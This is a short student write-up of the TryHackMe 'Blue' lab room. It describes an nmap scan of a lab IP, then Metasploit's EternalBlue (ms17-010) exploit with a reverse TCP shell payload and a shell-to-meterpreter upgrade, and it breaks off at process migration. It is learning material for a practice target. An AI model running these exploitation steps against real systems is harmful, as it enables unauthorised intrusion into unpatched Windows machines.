# Blue Room ([TryHackMe](https://tryhackme.com/room/blue))

## Recon (Nmap):

-   Given the information that machine does not respond to ping (ICMP) I knew I had to use a scan that does not ping the target, which is done through `-Pn`
-   First I am asked to find all of the open ports under 1000 which I did through `nmap -Pn -sV 10.10.141.20` and it came out to be 3 ports under 1000
-   ![1-scan](Screenshot%202025-06-10%20114933.png)
-   According to a walkthrough video, port 445 is vulnerable to eternal blue exploit which is `ms17-010` code.

## Gain Access (Metasploit):

-   Searched for the correct exploit using `search ms17-010`
-   Used exploit `exploit/windows/smb/ms17_010_eternalblue`.
-   Set the RHOSTS parameter that was _required_'
-   Set the payload according to the insutrctions using `set payload windows/x64/shell/reverse_tcp`
-   Run the exploit
-   ![exploit](Screenshot%202025-06-10%20123434.png)

## Escalate

-   Background the shell using `CTRL + Z`
-   Need to find how to go from shell to meterpreter so I searched `search shell_to_meterpreter` and it was under `post/multi/manage/shell_to_meterpreter`
-   After using the `use 0` command to use the module, I set the required parameter `SESSION` using `set SESSION 1` since the backgrounded shell had a session ID of 1 which I saw through `sessions -l`
-   After backgrounding the meterpreter shell according to the instructions and looking at the processes running through `ps` command, I was told to migrate to that process_ID.
-   Unfortunately I had to stop here due to issues with migrating to that process ID which led to me not completing this room completely and not getting as far as cracking passwords and CTFs later in the room

## Reflection:

-   Even though I didn't finish the room completely, I learned a lot, and some of that is highlighted here:
    -   Successfully completed basic recon and exploitation, as well as gaining access through reverse TCP connection.
    -   Attempted privilege escalation, faced some difficulties (PID migration).
    -   Will revisit privilege escalation later when it decides to work properly.
